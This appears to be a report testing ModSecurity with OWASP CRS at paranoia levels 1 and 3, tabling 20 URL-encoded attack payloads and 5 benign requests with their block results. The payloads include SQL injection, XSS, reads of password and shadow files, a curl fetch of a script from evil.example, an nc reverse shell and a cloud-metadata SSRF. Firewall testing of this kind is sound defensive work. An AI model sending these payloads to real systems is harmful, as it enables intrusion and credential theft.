# ModSecurity + OWASP CRS Evaluation Report: Paranoia Level 1 vs. Paranoia Level 3

## 1. Executive Summary Metrics

| Metric | CRS Paranoia Level 1 (`configs/pl1.conf`) | CRS Paranoia Level 3 (`configs/pl3.conf`) | Analysis |
|---|---|---|---|
| **Total Attack Payloads Tested** | 20 | 20 | SQLi, XSS, LFI, CMDi, SSRF |
| **Attacks Blocked (HTTP 403)** | 19 / 20 (95.0%) | **20 / 20 (100.0%)** | PL3 blocks obfuscated boolean/SSRF payloads missed at PL1 |
| **Total Benign Requests Tested** | 5 | 5 | Standard queries + punctuation/boolean strings |
| **False Positives (Benign Blocked)** | **0 / 5 (0.0%)** | 2 / 5 (40.0%) | PL3 flags apostrophes (`O'Connor`) and boolean operators (`>= &&`) under CRS `942430`/`942431` unless tuned via `configs/custom_exclusions.conf` |

## 2. Detailed Payload-by-Payload Results (25 Test Cases)

| ID | Category | Type | PL1 Status | PL3 Status | URI / Payload (URL-Encoded) |
|---|---|---|---|---|---|
| `ATK-01` | SQLi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/items?id=1%27%20OR%20%271%27%3D%271` |
| `ATK-02` | SQLi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/items?id=1%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--` |
| `ATK-03` | SQLi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/items?id=1%3B%20DROP%20TABLE%20sessions--` |
| `ATK-04` | SQLi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/items?id=1%27%20AND%20SLEEP%285%29--` |
| `ATK-05` | SQLi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/items?id=admin%27/%2Acomment%2A/OR/%2Acomment%2A/1%3D1%23` |
| `ATK-06` | XSS | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/search?q=%3Cscript%3Ealert%281%29%3C/script%3E` |
| `ATK-07` | XSS | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.cookie%29%3E` |
| `ATK-08` | XSS | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/search?q=javascript%3Aalert%28document.domain%29` |
| `ATK-09` | XSS | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/search?q=%3Csvg/onload%3Dconfirm%281%29%3E` |
| `ATK-10` | LFI | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/download?file=../../../../etc/passwd` |
| `ATK-11` | LFI | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/download?file=..%252f..%252f..%252fetc%252fshadow` |
| `ATK-12` | LFI | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/download?file=/proc/self/environ` |
| `ATK-13` | LFI | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/download?file=..%5C..%5C..%5CWindows%5Cwin.ini` |
| `ATK-14` | CMDi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/diag?host=127.0.0.1%3B%20cat%20/etc/passwd` |
| `ATK-15` | CMDi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/diag?host=127.0.0.1%20%26%26%20/bin/sh%20-i` |
| `ATK-16` | CMDi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/diag?host=%24%28curl%20http%3A//evil.example/shell.sh%29` |
| `ATK-17` | CMDi | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/diag?host=127.0.0.1%20%7C%20nc%20-e%20/bin/sh%2010.0.0.1%204444` |
| `ATK-18` | SSRF | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/webhook?url=http%3A//169.254.169.254/latest/meta-data/iam/` |
| `ATK-19` | SSRF | attack | `403` (BLOCKED) | `403` (BLOCKED) | `/webhook?url=file%3A///etc/passwd` |
| `ATK-20` | SQLi-PL3 | attack | `404` (ALLOWED) | `403` (BLOCKED) | `/items?id=10%26%261%3D%3D1` |
| `BEN-01` | Benign | benign | `404` (ALLOWED) | `404` (ALLOWED) | `/items?id=42` |
| `BEN-02` | Benign | benign | `200` (ALLOWED) | `200` (ALLOWED) | `/search?q=wireless%20mechanical%20keyboard` |
| `BEN-03` | Benign | benign | `404` (ALLOWED) | `403` (BLOCKED) | `/profile?name=O%27Connor%20%26%20Sons%20%28UK%29%20--%20Tier-1%20Par` |
| `BEN-04` | Benign | benign | `200` (ALLOWED) | `403` (BLOCKED) | `/note?math=score%20%3E%3D%205%20%26%26%20ratio%20%3C%3D%2010%20%7C%7` |
| `BEN-05` | Benign | benign | `404` (ALLOWED) | `404` (ALLOWED) | `/api/feedback?comment=Great%20release%21%20Everything%20works%20fast` |
